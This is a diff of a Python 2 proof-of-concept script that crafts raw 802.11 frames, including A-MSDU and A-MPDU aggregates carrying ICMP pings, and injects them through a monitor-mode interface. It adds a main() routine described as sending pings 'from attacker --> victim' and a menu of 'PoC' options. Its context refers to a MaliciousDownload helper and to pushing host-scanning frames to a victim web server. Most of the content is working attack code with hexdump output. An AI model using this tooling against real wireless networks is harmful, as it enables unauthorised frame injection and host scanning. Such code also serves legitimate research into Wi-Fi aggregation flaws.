@@ -1,7 +1,7 @@
 #!/usr/bin/env python2
 
 from rpyutils import printd, Color, Level, clr, VERBOSITY
-from packets import AMPDUPacket, AMSDUPacket, ping_packet, arp_packet, tcp_syn, ssid_packet, probe_response
+from packets import Dot11Packet, AMPDUPacket, AMSDUPacket, ping_packet, arp_packet, tcp_syn, ssid_packet, probe_response
 import requests
 import random
 import sys
@@ -47,7 +47,58 @@ def main_download():
     md = MaliciousDownload(container)
     md.write()
 """
-# Connect to victim web server and POST malicious host scanning ICMP frames (push to victim)
+def main():
+    count = 1
+    ip_count = 1
+
+    # send the packet a number of times
+    for i in range(0, 10):
+        count = (count + 1) % 1024
+        ip_count = (ip_count % 255) + 1
+
+        # Ping from attacker --> victim
+        # You need to change the MAC addresses and IPs to match the remote AP
+        pkt = Dot11Packet('ff:ff:ff:ff:ff:ff', '64:D1:A3:3D:26:5B', '64:D1:A3:3D:26:5B')
+
+        printd(clr(Color.YELLOW, "Radiotap:"), Level.INFO)
+        #sys.stdout.flush()
+        hexdump.hexdump(str(pkt.rt))
+
+        for character in str(pkt.rt):
+          # this prints "\x 00 \x 00 \x 12 \x 00 \x 2e \x 08 \x 00 \x 00 \x 00 \x 6c \x 6c \x 09 \x c0 \x 00 \x c0 \x 01 \x 00 \x 00 "  
+          print "\\x",character.encode('hex'),
+          sys.stdout.flush()
+        printd("", Level.INFO) #print a linefeed
+
+        printd(clr(Color.YELLOW, "802.11 hdr:"), Level.INFO)
+        #sys.stdout.flush()
+        hexdump.hexdump(str(pkt.dot11hdr))
+        sys.stdout.flush()
+
+        # add an MSDU 
+        pkt.add_msdu(ping_packet(count, "10.0.0.1", "192.168.0." + str(ip_count)))
+        printd(clr(Color.YELLOW, "MSDU added:"), Level.INFO)
+        #sys.stdout.flush()
+        hexdump.hexdump(str(ping_packet(count, "10.0.0.1", "192.168.0." + str(ip_count))))
+        sys.stdout.flush()
+
+        printd(clr(Color.YELLOW, "Radiotap + 802.11 hdr + MSDU + CRC:"), Level.INFO)
+        #sys.stdout.flush()
+        hexdump.hexdump(str(pkt.data))
+        sys.stdout.flush()
+
+        for character in str(pkt.data):
+              # this prints "\x 80 \x 04 \x bb \x 4e \x 88 \x 02 \x 00 \x 00 \x ff \x ff \x ff \x ff \x ff \x ff \x 64 "
+            print "\\x",character.encode('hex'),
+            #print character, character.encode('hex'),
+        printd("", Level.INFO) #print a linefeed
+
+        # send the packet
+        pkt.send()    #the interface has to be in monitor mode
+        printd("packet sent", Level.INFO)
+        time.sleep(0.1)
+
+# send packets with a number of MSDU (A-MSDU)
 def main_amsdu():
     count = 1
     ip_count = 0
@@ -72,6 +123,13 @@ def main_amsdu():
     printd(clr(Color.YELLOW, "AMSDU dot11hdr:"), Level.INFO)
     #sys.stdout.flush()
     hexdump.hexdump(str(amsdu_pkt.dot11hdr))
+    sys.stdout.flush()
+
+    # add an MSDU 
+    amsdu_pkt.add_msdu(ping_packet(count, "10.0.0.1", "192.168.0." + str(ip_count)))
+    printd(clr(Color.YELLOW, "AMPDU with the MSDU added:"), Level.INFO)
+    #sys.stdout.flush()
+    hexdump.hexdump(str(amsdu_pkt))
     sys.stdout.flush()
 
     printd(clr(Color.YELLOW, "AMSDU data:"), Level.INFO)
@@ -134,7 +192,7 @@ def main_ampdu():
         sys.stdout.flush()
 
         ampdu_pkt.add_padding(8)
-        printd(clr(Color.YELLOW, "AMPDU with MSDU and padding added:"), Level.INFO)
+        printd(clr(Color.YELLOW, "AMPDU with MSDU and 8 padding delimiters added:"), Level.INFO)
         #sys.stdout.flush()
         hexdump.hexdump(str(ampdu_pkt))
         sys.stdout.flush()
@@ -151,7 +209,7 @@ def main_ampdu():
         #ampdu_pkt.add_padding(8)
         #container += str(ampdu_pkt)
     """ end package """
-    printd(clr(Color.BLUE, "Finished building container! Sending..."), Level.INFO)
+    printd(clr(Color.BLUE, "Final A-MPDU built:"), Level.INFO)
     sys.stdout.flush()
 
     #hexdump.hexdump('\x00'*16)
@@ -190,14 +248,18 @@ def main_ampdu():
 
 if __name__ == "__main__":
     try:
-        pocnum = raw_input("option 1: send AMSDUs. "
-                           "option 2: send AMPDUs. "
+        pocnum = raw_input("option 1: send normal packets. "
+                           "option 2: send AMSDUs. "
+                           "option 3: send AMPDUs. "
                            "Choice: ")
         if pocnum == "1":
-            main_amsdu()
+            main()
         elif pocnum == "2":
+            main_amsdu()
+        elif pocnum == "3":
             main_ampdu()
         else:
             printd("Invalid PoC number.", Level.CRITICAL)
+
     except KeyboardInterrupt:
         printd("\nExiting...", Level.INFO)
